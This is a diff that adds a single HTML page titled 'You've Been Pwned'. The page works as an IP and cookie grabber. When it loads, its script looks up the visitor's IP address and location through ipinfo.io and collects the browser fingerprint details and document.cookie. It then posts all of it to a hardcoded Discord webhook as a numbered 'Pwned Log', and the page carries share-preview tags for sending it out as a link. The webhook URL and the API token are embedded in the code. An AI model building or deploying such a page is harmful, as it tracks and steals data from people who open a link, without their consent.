@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Your System Has Been Pwned</title>
+<!-- Link Preview Meta Tags -->
+<meta property="og:title" content="You've Been Pwned" />
+<meta property="og:description" content="A security breach has been detected." />
+<meta property="og:image" content="https://yourdomain.com/image.png" /> <!-- Replace with your image URL -->
+<meta property="og:url" content="https://yourwebsite.com" /> <!-- Replace with your site URL -->
+<meta property="og:type" content="website" />
+
+<!-- Styling -->
+<style>
+  body {
+    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+    font-family: 'Arial', sans-serif;
+    color: #fff;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: start;
+    min-height: 100vh;
+    margin: 0;
+    padding: 50px 20px;
+  }
+
+  h1 {
+    font-size: 3em;
+    margin-bottom: 0.2em;
+    text-shadow: 2px 2px 4px #000;
+  }
+
+  p {
+    font-size: 1.2em;
+    max-width: 600px;
+    text-align: center;
+    line-height: 1.4em;
+    margin-bottom: 2em;
+  }
+
+  @keyframes pulse {
+    0% { text-shadow: 0 0 10px #fff; }
+    50% { text-shadow: 0 0 20px #ff0; }
+    100% { text-shadow: 0 0 10px #fff; }
+  }
+
+  .warning {
+    font-size: 2em;
+    color: #ff4444;
+    animation: pulse 1.5s infinite;
+    margin-top: 20px;
+  }
+</style>
+</head>
+<body>
+
+<h1>You've Been Pwned!</h1>
+<p>Security breach detected. Your system has been compromised. Details are being collected and sent.</p>
+<div class="warning">Get Pwned Sonion.</div>
+
+<script>
+const webhookURL = 'https://discord.com/api/webhooks/1527471188119519283/I8PDbadvQhQamiqof_5EnkKMGqHaB2ffeDbld4i2_L5ip-Z9MTubpLZUQzSXp_SruQ_8'; // Your webhook
+const ipinfoToken = '1ee16d4b922029'; // Your IPinfo token
+
+// Persist counter across sessions
+let counter = localStorage.getItem('logCounter') || 0;
+const logNames = ["Alpha", "Bravo", "Charlie", "Delta", "Echo"]; // Example names
+
+window.addEventListener('load', () => {
+  // Fetch IP info
+  fetch(`https://ipinfo.io/json?token=${ipinfoToken}`)
+    .then(response => response.json())
+    .then(data => {
+      // Collect additional info
+      const userAgent = navigator.userAgent;
+      const language = navigator.language;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const screenRes = `${window.screen.width}x${window.screen.height}`;
+      const referrer = document.referrer || 'Direct';
+
+      // Cookies (try to grab some known cookies or all)
+      const allCookies = document.cookie || 'No cookies accessible';
+
+      // Platform info
+      const platform = navigator.platform;
+      const browserName = (function() {
+        const ua = navigator.userAgent;
+        if (ua.indexOf('Firefox') !== -1) return 'Firefox';
+        if (ua.indexOf('Chrome') !== -1) return 'Chrome';
+        if (ua.indexOf('Safari') !== -1) return 'Safari';
+        if (ua.indexOf('Edge') !== -1) return 'Edge';
+        if (ua.indexOf('MSIE') !== -1 || ua.indexOf('Trident') !== -1) return 'Internet Explorer';
+        return 'Other';
+      })();
+      const browserVersion = (function() {
+        const ua = navigator.userAgent;
+        const match = ua.match(/(Firefox|Chrome|Safari|Edge|MSIE|Trident)\/([0-9.]+)/);
+        if (match) return match[2];
+        return 'Unknown';
+      })();
+
+      // Display info
+      document.body.innerHTML += `
+        <h2>Collected Info</h2>
+        <ul style="max-width: 600px; list-style: none; padding: 0;">
+          <li><strong>IP:</strong> ${data.ip}</li>
+          <li><strong>City:</strong> ${data.city}</li>
+          <li><strong>Region:</strong> ${data.region}</li>
+          <li><strong>Country:</strong> ${data.country}</li>
+          <li><strong>Loc:</strong> ${data.loc}</li>
+          <li><strong>User Agent:</strong> ${userAgent}</li>
+          <li><strong>Language:</strong> ${language}</li>
+          <li><strong>Timezone:</strong> ${timezone}</li>
+          <li><strong>Screen:</strong> ${screenRes}</li>
+          <li><strong>Referrer:</strong> ${referrer}</li>
+          <li><strong>Cookies:</strong> ${allCookies}</li>
+          <li><strong>Platform:</strong> ${platform}</li>
+          <li><strong>Browser:</strong> ${browserName} ${browserVersion}</li>
+        </ul>
+      `;
+
+      // Prepare name for logs
+      const logName = logNames[counter % logNames.length] || `User${counter}`;
+
+      // Send to webhook
+      counter++;
+      localStorage.setItem('logCounter', counter);
+      const embed = {
+        title: `Pwned Log #${counter} (${logName})`,
+        description: `
+**IP:** ${data.ip}
+**City:** ${data.city}
+**Region:** ${data.region}
+**Country:** ${data.country}
+**Loc:** ${data.loc}
+**User Agent:** ${userAgent}
+**Language:** ${language}
+**Timezone:** ${timezone}
+**Screen:** ${screenRes}
+**Referrer:** ${referrer}
+**Cookies:** ${allCookies}
+**Platform:** ${platform}
+**Browser:** ${browserName} ${browserVersion}
+        `,
+        color: 0xff0000
+      };
+      const payload = { embeds: [embed] };
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).then(res => {
+        if (res.ok) {
+          console.log(`Pwned Log #${counter} (${logName}) sent successfully`);
+        } else {
+          console.error(`Failed to send Pwned Log #${counter}`);
+        }
+      }).catch(error => {
+        console.error(`Error sending Pwned Log #${counter}:`, error);
+      });
+    })
+    .catch(error => {
+      document.body.innerHTML += '<p>Error fetching location.</p>';
+      console.error(error);
+    });
+});
+</script>
+
+</body>
+</html>
